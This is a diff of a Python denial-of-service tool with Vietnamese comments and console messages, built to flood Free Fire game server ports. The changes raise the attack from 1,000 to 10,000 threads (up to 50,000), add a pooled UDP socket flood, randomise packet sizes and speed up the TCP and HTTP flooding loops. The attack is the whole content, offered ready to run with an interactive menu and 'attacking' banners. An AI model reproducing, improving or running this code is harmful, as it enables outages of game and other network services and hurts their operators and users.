@@ -1,7 +1,6 @@
 # ============================================
-# FF BYPASS DDoS - 1000 THREADS
-# DÙNG THREAD POOL - QUẢN LÝ SOCKET THEO BATCH
-# KHÔNG MỞ QUÁ NHIỀU SOCKET CÙNG LÚC
+# FF BYPASS DDoS - 10000 THREADS
+# BATCH 500 - SOCKET POOL 100 - KHÔNG CRASH
 # ============================================
 
 import socket
@@ -10,7 +9,6 @@ import threading
 import os
 import random
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
 
 # ============================================
 # PORT GAME FREE FIRE - FULL
@@ -27,16 +25,17 @@ for start, end in [
     FF_PORTS.extend(range(start, end))
 
 # ============================================
-# ENGINE 1000 THREADS
+# ENGINE 10000 THREADS - SOCKET POOL
 # ============================================
-class ThousandThreadEngine:
+class TenThousandThreadEngine:
     def __init__(self):
         self.targets = []
         self.running = False
         self.packets = 0
         self.errors = 0
         self.lock = threading.Lock()
-        self.executor = None
+        self.udp_pool = []
+        self.pool_lock = threading.Lock()
     
     def inc(self, n=1):
         with self.lock: self.packets += n
@@ -45,39 +44,56 @@ class ThousandThreadEngine:
     def get(self):
         with self.lock: return self.packets, self.errors
 
+    def _init_pool(self):
+        """Tạo 100 socket UDP dùng chung"""
+        for _ in range(100):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16384)
+                s.settimeout(0.1)
+                self.udp_pool.append(s)
+            except:
+                pass
+
+    def _get_socket(self):
+        """Lấy socket từ pool"""
+        with self.pool_lock:
+            if self.udp_pool:
+                s = self.udp_pool.pop(0)
+                self.udp_pool.append(s)
+                return s
+        return None
+
     def _fire_udp(self, batch_id):
-        """Mỗi batch dùng 1 socket riêng - tránh xung đột"""
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(0.2)
-        except:
-            return
-        
-        data = os.urandom(2048)
+        """UDP Flood dùng chung socket pool"""
+        data = os.urandom(random.randint(512, 2048))
         count = 0
-        start = time.time()
         
-        # Mỗi batch chạy 5 giây rồi nghỉ - tránh quá tải
-        while self.running and count < 5000:
+        while self.running and count < 10000:
+            s = self._get_socket()
+            if s is None:
+                time.sleep(0.0001)
+                continue
+            
             try:
                 ip = random.choice(self.targets)
                 port = random.choice(FF_PORTS)
                 
-                for _ in range(20):
+                for _ in range(random.randint(3, 10)):
                     s.sendto(data, (ip, port))
                     self.inc()
                     count += 1
                     
             except:
                 self.err()
-        
-        s.close()
+            
+            time.sleep(0.00001)
 
     def _fire_tcp(self, batch_id):
-        """TCP SYN - mỗi lần 1 socket mới"""
+        """TCP SYN"""
         count = 0
-        while self.running and count < 3000:
+        while self.running and count < 5000:
             s = None
             try:
                 ip = random.choice(self.targets)
@@ -85,9 +101,9 @@ class ThousandThreadEngine:
                 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.settimeout(0.15)
+                s.settimeout(0.1)
                 s.connect_ex((ip, port))
-                s.send(os.urandom(256))
+                s.send(os.urandom(64))
                 self.inc()
                 count += 1
                 
@@ -108,7 +124,7 @@ class ThousandThreadEngine:
                  "/api/v1/battle/update", "/auth/login"]
         
         count = 0
-        while self.running and count < 2000:
+        while self.running and count < 3000:
             s = None
             try:
                 ip = random.choice(self.targets)
@@ -116,7 +132,7 @@ class ThousandThreadEngine:
                 
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                s.settimeout(0.3)
+                s.settimeout(0.2)
                 s.connect_ex((ip, port))
                 
                 req = (
@@ -137,8 +153,8 @@ class ThousandThreadEngine:
                     except: pass
 
     def _batch_manager(self, total_threads, worker_func):
-        """Quản lý batch - tạo thread theo đợt 200 cái một"""
-        batch_size = 200
+        """Quản lý batch - tạo thread theo đợt 500 cái một"""
+        batch_size = 500
         created = 0
         
         while self.running and created < total_threads:
@@ -153,9 +169,9 @@ class ThousandThreadEngine:
                 t.start()
                 created += 1
             
-            # Nghỉ 0.5s giữa các batch để hệ thống thở
             if created < total_threads:
-                time.sleep(0.5)
+                time.sleep(0.3)
+                print(f"\r  [⏳] Đã tạo {created}/{total_threads} threads...", end='')
 
     def start(self, targets, threads, udp, tcp, http):
         if self.running:
@@ -169,6 +185,9 @@ class ThousandThreadEngine:
         self.running = True
         self.packets = 0
         self.errors = 0
+        
+        # Khởi tạo socket pool
+        self._init_pool()
         
         total_started = 0
         
@@ -195,15 +214,19 @@ class ThousandThreadEngine:
 
     def stop(self):
         self.running = False
+        for s in self.udp_pool:
+            try: s.close()
+            except: pass
+        self.udp_pool.clear()
 
 
 def print_banner():
     os.system('clear' if os.name != 'nt' else 'cls')
     print(f"""
     ╔══════════════════════════════════════════╗
-    ║  ☠ FF DDoS 1000 THREADS ☠            ║
+    ║  ☠ FF DDoS 10000 THREADS ☠           ║
     ║  {len(FF_PORTS)} PORTS | UDP+TCP+HTTP          ║
-    ║  BATCH MODE - KHÔNG CRASH               ║
+    ║  BATCH 500 | SOCKET POOL 100            ║
     ╚══════════════════════════════════════════╝
     """)
 
@@ -223,19 +246,21 @@ def main():
         input()
         return
     
-    print(f"\n  [+] SỐ THREADS (mặc định 1000):")
+    print(f"\n  [+] SỐ THREADS (mặc định 10000):")
     try:
-        threads = int(input("  >> ").strip() or "1000")
-        if threads > 2000:
-            threads = 2000
-            print(f"  [!] Giới hạn 2000 threads")
+        threads = int(input("  >> ").strip() or "10000")
+        if threads > 50000:
+            threads = 50000
+            print(f"  [!] Giới hạn 50000 threads")
+        if threads < 100:
+            threads = 100
     except:
-        threads = 1000
+        threads = 10000
     
     print(f"\n  [+] CHẾ ĐỘ:")
-    print(f"      1. UDP+TCP+HTTP (1000 THREADS)")
-    print(f"      2. UDP ONLY (1000 THREADS)")
-    print(f"      3. TCP ONLY (1000 THREADS)")
+    print(f"      1. UDP+TCP+HTTP (MẠNH NHẤT)")
+    print(f"      2. UDP ONLY")
+    print(f"      3. TCP ONLY")
     mode = input("  >> ").strip() or "1"
     
     udp = mode in ['1', '2']
@@ -243,9 +268,10 @@ def main():
     http = mode in ['1']
     
     print(f"\n  [☠] ĐANG TẠO {threads} THREADS...")
-    print(f"  [!] Sẽ tạo theo batch 200 để tránh crash...")
+    print(f"  [!] Sẽ tạo theo batch 500...")
+    print(f"  [!] Dùng 100 socket UDP dùng chung...")
     
-    engine = ThousandThreadEngine()
+    engine = TenThousandThreadEngine()
     total = engine.start(targets, threads, udp, tcp, http)
     
     if not total:
@@ -254,10 +280,10 @@ def main():
         return
     
     start_time = time.time()
-    print(f"  [✅] ĐÃ LÊN LỊCH {total} THREADS!")
+    print(f"\n  [✅] ĐÃ LÊN LỊCH {total} THREADS!")
     print(f"  [🎯] {len(targets)} IP | UDP:{udp} TCP:{tcp} HTTP:{http}")
     print(f"\n  ╔══════════════════════════════════╗")
-    print(f"  ║  ĐANG TẤN CÔNG 1000 THREADS... ║")
+    print(f"  ║  ĐANG TẤN CÔNG {threads} THREADS... ║")
     print(f"  ║  ENTER = DỪNG                  ║")
     print(f"  ╚══════════════════════════════════╝")
     
